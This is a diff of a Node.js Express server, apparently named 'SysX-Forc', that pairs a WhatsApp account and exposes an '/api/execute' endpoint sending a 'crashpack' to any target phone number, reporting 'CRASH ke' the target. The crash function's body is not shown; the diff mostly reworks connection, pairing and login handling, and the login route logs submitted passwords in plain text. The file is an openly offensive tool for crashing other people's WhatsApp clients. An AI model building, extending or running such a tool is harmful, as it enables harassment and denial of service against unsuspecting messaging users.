@@ -18,7 +18,6 @@ app.use(express.static('public'));
 let sock = null;
 let isConnected = false;
 let pairCode = '';
-let pairingComplete = false;
 
 // ==================== FUNGSI CRASH ====================
 async function crashpack(sock, jid) {
@@ -76,21 +75,10 @@ async function connectWA() {
     try {
         console.log('🔄 Connecting to WhatsApp...');
 
-        // Hapus auth_info kalo ada error
+        // Hapus auth_info kalo ada
         if (fs.existsSync('auth_info')) {
-            try {
-                const credsPath = path.join('auth_info', 'creds.json');
-                if (fs.existsSync(credsPath)) {
-                    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
-                    if (!creds.me || !creds.me.id) {
-                        console.log('⚠️ Auth corrupt, deleting...');
-                        fs.rmSync('auth_info', { recursive: true, force: true });
-                    }
-                }
-            } catch (e) {
-                console.log('⚠️ Auth error, deleting...');
-                fs.rmSync('auth_info', { recursive: true, force: true });
-            }
+            fs.rmSync('auth_info', { recursive: true, force: true });
+            console.log('🗑️ Auth folder deleted');
         }
 
         const { state, saveCreds } = await useMultiFileAuthState('auth_info');
@@ -100,31 +88,28 @@ async function connectWA() {
             auth: state,
             printQRInTerminal: false,
             logger: pino({ level: 'silent' }),
-            browser: ['SysX-Forc', 'Chrome', '120.0.0.0'],
-            syncFullHistory: false,
-            markOnlineOnConnect: false,
-            connectTimeoutMs: 60000,
-            defaultQueryTimeoutMs: 60000,
-            keepAliveIntervalMs: 10000
+            browser: ['SysX-Forc', 'Chrome', '120.0.0.0']
         });
 
         sock.ev.on('creds.update', saveCreds);
 
         sock.ev.on('connection.update', (update) => {
-            const { connection, lastDisconnect } = update;
+            const { connection, lastDisconnect, qr } = update;
+
+            if (qr) {
+                console.log('📱 QR CODE GENERATED');
+            }
 
             if (connection === 'open') {
                 isConnected = true;
-                pairingComplete = true;
                 console.log('✅ CONNECTED TO WHATSAPP!');
-                console.log('📱 PAIRING COMPLETE!');
             }
 
             if (connection === 'close') {
                 isConnected = false;
                 const statusCode = lastDisconnect?.error?.output?.statusCode;
                 if (statusCode === DisconnectReason.loggedOut) {
-                    console.log('🚫 LOGGED OUT, hapus auth_info');
+                    console.log('🚫 LOGGED OUT');
                     if (fs.existsSync('auth_info')) {
                         fs.rmSync('auth_info', { recursive: true, force: true });
                     }
@@ -148,19 +133,16 @@ async function connectWA() {
     }
 }
 
-// ==================== API ENDPOINTS ====================
+// ==================== API ====================
 
-// LOGIN - PASTIKAN PASSWORD SAMA!
+// LOGIN
 app.post('/api/login', (req, res) => {
     const { password } = req.body;
-    const expected = process.env.PASSWORD || 'force$$$';
-    
-    console.log(`🔐 Login attempt: ${password} vs ${expected}`);
-    
-    if (password === expected) {
-        res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
+    console.log(`🔐 Login: ${password} vs ${process.env.PASSWORD}`);
+    if (password === process.env.PASSWORD) {
+        res.json({ success: true });
     } else {
-        res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
+        res.status(401).json({ success: false });
     }
 });
 
@@ -168,38 +150,39 @@ app.post('/api/login', (req, res) => {
 app.get('/api/status', (req, res) => {
     res.json({
         connected: isConnected,
-        pairCode: pairCode || null,
-        pairingComplete: pairingComplete
+        pairCode: pairCode || null
     });
 });
 
-// PAIR CODE - GENERATE PAIRING CODE
+// PAIR - GENERATE PAIRING CODE
 app.post('/api/pair', async (req, res) => {
     try {
         const { number } = req.body;
         if (!number) {
-            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
+            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi!' });
         }
 
-        console.log(`📱 Request pair for: ${number}`);
+        console.log(`📱 Pair request for: ${number}`);
 
-        if (!sock) {
+        // PASTIKAN SOCKET AKTIF!
+        if (!sock || !isConnected) {
+            console.log('🔄 Socket not connected, reconnecting...');
             await connectWA();
+            // Tunggu koneksi
+            let wait = 0;
+            while (!isConnected && wait < 10) {
+                await new Promise(r => setTimeout(r, 1000));
+                wait++;
+            }
         }
 
-        let attempts = 0;
-        while (!sock && attempts < 10) {
-            await new Promise(r => setTimeout(r, 1000));
-            attempts++;
-        }
-
-        if (!sock) {
-            return res.status(500).json({ success: false, error: 'Gagal inisialisasi socket' });
+        if (!sock || !isConnected) {
+            return res.status(500).json({ success: false, error: 'Gagal konek ke WhatsApp' });
         }
 
         const code = await sock.requestPairingCode(number);
         pairCode = code;
-        console.log(`✅ Pair code generated: ${code}`);
+        console.log(`✅ PAIR CODE: ${code}`);
         res.json({ success: true, pairCode: code });
     } catch (error) {
         console.error('🔥 PAIR ERROR:', error.message);
@@ -207,28 +190,24 @@ app.post('/api/pair', async (req, res) => {
     }
 });
 
-// EXECUTE CRASH
+// EXECUTE
 app.post('/api/execute', async (req, res) => {
     try {
         const { target } = req.body;
         if (!target) {
-            return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
+            return res.status(400).json({ success: false, error: 'Target wajib diisi!' });
         }
-
         if (!sock || !isConnected) {
-            return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
+            return res.status(500).json({ success: false, error: 'WA belum connect!' });
         }
-
         const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
         const result = await crashpack(sock, jid);
-
         if (result.success) {
-            res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
+            res.json({ success: true, message: `✅ CRASH ke ${target}!` });
         } else {
             res.status(500).json({ success: false, error: result.error });
         }
     } catch (error) {
-        console.error('🔥 EXECUTE ERROR:', error.message);
         res.status(500).json({ success: false, error: error.message });
     }
 });
@@ -236,24 +215,20 @@ app.post('/api/execute', async (req, res) => {
 // LOGOUT
 app.post('/api/logout', async (req, res) => {
     try {
-        if (sock) {
-            await sock.logout();
-        }
+        if (sock) await sock.logout();
         isConnected = false;
         sock = null;
         pairCode = '';
-        pairingComplete = false;
         if (fs.existsSync('auth_info')) {
             fs.rmSync('auth_info', { recursive: true, force: true });
         }
-        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
+        res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
 });
 
 // ==================== START ====================
-console.log('🔥 SYSX-FORC STARTING...');
 connectWA();
 
 app.listen(PORT, () => {
